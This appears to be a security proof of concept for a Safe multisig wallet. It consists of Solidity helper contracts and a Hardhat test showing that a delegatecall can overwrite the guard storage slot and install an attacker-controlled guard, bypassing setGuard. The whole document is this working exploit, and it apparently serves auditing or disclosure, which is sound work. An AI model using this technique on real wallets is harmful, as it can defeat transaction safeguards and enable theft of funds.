// contracts/GuardChanger.sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

contract GuardChanger {
    function change(address newGuard) external {
        bytes32 slot = 0x4a204f620c8c5ccdca3fd54d003badd85ba500436a431f0cbda4f558c93c34c8; // GUARD_STORAGE_SLOT
        assembly {
            sstore(slot, newGuard)
        }
    }
}

// contracts/AttackerGuard.sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

contract AttackerGuard {
    event Checked(bytes32 txHash, bool success);

    function checkTransaction(
        address /*to*/,
        uint256 /*value*/,
        bytes calldata /*data*/,
        uint8 /*operation*/,
        uint256 /*safeTxGas*/,
        uint256 /*baseGas*/,
        uint256 /*gasPrice*/,
        address /*gasToken*/,
        address payable /*refundReceiver*/,
        bytes calldata /*signatures*/,
        address /*msgSender*/
    ) external {}

    function checkAfterExecution(bytes32 txHash, bool success) external {
        emit Checked(txHash, success);
    }
}

// test/GuardChange.poc.ts
import { expect } from "chai";
import { ethers } from "hardhat";

describe("PoC: Change Safe guard via delegatecall without calling setGuard", function () {
  it("should change the guard by delegatecalling GuardChanger.change", async function () {
    const [deployer, alice] = await ethers.getSigners();

    // Deploy Safe
    const Safe = await ethers.getContractFactory("Safe_v1", deployer);
    const safe = await Safe.deploy();
    await safe.waitForDeployment();
    const safeAddress = await safe.getAddress();

    // Setup Safe with Alice as sole owner (threshold = 1)
    await (
      await safe.setup(
        [alice.address], // owners
        1,               // threshold
        ethers.ZeroAddress, // to
        "0x",               // data
        ethers.ZeroAddress, // fallbackHandler
        ethers.ZeroAddress, // paymentToken
        0,                  // payment
        ethers.ZeroAddress  // paymentReceiver
      )
    ).wait();

    // Deploy helper contracts
    const GuardChanger = await ethers.getContractFactory("GuardChanger", deployer);
    const guardChanger = await GuardChanger.deploy();
    await guardChanger.waitForDeployment();
    const guardChangerAddress = await guardChanger.getAddress();

    const AttackerGuard = await ethers.getContractFactory("AttackerGuard", deployer);
    const attackerGuard = await AttackerGuard.deploy();
    await attackerGuard.waitForDeployment();
    const attackerGuardAddress = await attackerGuard.getAddress();

    // Encode delegatecall payload to change the guard storage slot
    const data = GuardChanger.interface.encodeFunctionData("change", [attackerGuardAddress]);

    // Build a pre-validated signature for Alice (the tx sender and owner)
    // Signature format: r = owner address (left-padded to 32 bytes), s = 0x0, v = 1
    const r = ethers.zeroPadValue(alice.address, 32);
    const s = ethers.ZeroHash;
    const v = new Uint8Array([1]);
    const signature = ethers.concat([r, s, v]);

    // Read guard slot before
    const GUARD_SLOT = "0x4a204f620c8c5ccdca3fd54d003badd85ba500436a431f0cbda4f558c93c34c8";
    const before = await ethers.provider.getStorageAt(safeAddress, GUARD_SLOT);

    // Execute transaction via delegatecall to change the guard directly in Safe's storage
    await expect(
      safe.connect(alice).execTransaction(
        guardChangerAddress, // to
        0,                   // value
        data,                // data
        1,                   // operation = Enum.Operation.DelegateCall
        0,                   // safeTxGas
        0,                   // baseGas
        0,                   // gasPrice
        ethers.ZeroAddress,  // gasToken
        ethers.ZeroAddress,  // refundReceiver
        signature            // signatures
      )
    ).to.emit(attackerGuard, "Checked"); // guard will be active for checkAfterExecution

    // Read guard slot after and assert it was changed to attackerGuard
    const after = await ethers.provider.getStorageAt(safeAddress, GUARD_SLOT);
    const storedAddress = ethers.getAddress("0x" + after.slice(26)); // last 20 bytes

    expect(storedAddress).to.not.equal(ethers.getAddress("0x" + before.slice(26)));
    expect(storedAddress).to.equal(attackerGuardAddress);
  });
});